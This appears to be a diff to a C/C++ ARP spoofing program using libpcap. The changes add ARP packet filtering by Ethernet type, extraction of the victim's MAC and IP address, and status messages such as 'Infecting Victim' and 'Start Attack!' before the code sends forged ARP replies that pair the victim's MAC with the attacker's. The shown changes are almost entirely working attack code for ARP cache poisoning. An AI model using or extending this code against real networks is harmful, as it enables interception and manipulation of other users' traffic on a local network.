@@ -54,6 +54,7 @@ int main(int argc, char* argv[]) {
    char Attacker_Mac[100] = {0,};   //src_mac
 
    strcpy(Attacker_Mac,get_mac_address());
+   printf("Attacker mac : ");
 	puts(Attacker_Mac);
 
 
@@ -76,8 +77,10 @@ int main(int argc, char* argv[]) {
 	char target_mac[20] = {0,};//target_mac
 	struct ip* iph;
 	struct libnet_ethernet_hdr* mac;
+   //EthHdr -> type()
+   struct EthHdr *t;
 
-
+   printf("Infecting Victim\n");
    while(true){
       int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
       if (res != 0) {
@@ -98,32 +101,41 @@ int main(int argc, char* argv[]) {
          break;
 
       }
-
       
-      printf("Destination Mac : ");
+      // printf("ARP test\n");
+      t = (EthHdr*)packet;      
+      // printf("%x\n",t->type_); //packet type 16
+      // printf("%d\n",t->type_); //packet type 10
+      if(t->type_ == 1544){
+         printf("I got arp packet!\n");
+         printf("Destination Mac : ");
 
-      mac = (libnet_ethernet_hdr*)packet;// packet -> ethernet hdr
-      int i;
-      char buf[10];
-      memset(target_mac,0,20);//memory set
-      for(i=0;i<6;i++){
-         sprintf(buf,"%02x:",mac->ether_shost[i]);
-         strcat(target_mac,buf);
+         mac = (libnet_ethernet_hdr*)packet;// packet -> ethernet hdr
+         int i;
+         char buf[10];
+         memset(target_mac,0,20);//memory set
+         for(i=0;i<6;i++){
+            sprintf(buf,"%02x:",mac->ether_shost[i]);
+            strcat(target_mac,buf);
+         }
+         target_mac[17]='\0';
+         puts(target_mac);
+
+         printf("Ip : ");
+
+         iph = (struct ip*)(packet+sizeof(struct libnet_ethernet_hdr) + 2);
+         printf("%s\n",inet_ntoa(iph->ip_src));
+         // printf("%s\n",target_mac);
+         if(strcmp(inet_ntoa(iph->ip_src),argv[2]) == 0)
+         {
+            break;
+         }
       }
-      target_mac[17]='\0';
-      puts(target_mac);
-
-      printf("Ip : ");
-
-      iph = (struct ip*)(packet+sizeof(struct libnet_ethernet_hdr) + 2);
-	   printf("%s\n",inet_ntoa(iph->ip_src));
-	   // printf("%s\n",target_mac);
-	   if(strcmp(inet_ntoa(iph->ip_src),argv[2]) == 0)
-	   {
-	   	break;
-	   }
 	   
    }
+   printf("I Found victim's mac!\n");
+   printf("Start Attack!\n");
+
    //attack
    packet.eth_.dmac_ = Mac(target_mac); // victim MAC
    packet.eth_.smac_ = Mac(Attacker_Mac); // hacker MAC
@@ -145,6 +157,9 @@ int main(int argc, char* argv[]) {
    }else{
       printf("attack success!\n");
    }
+
+
+   
 
 
 
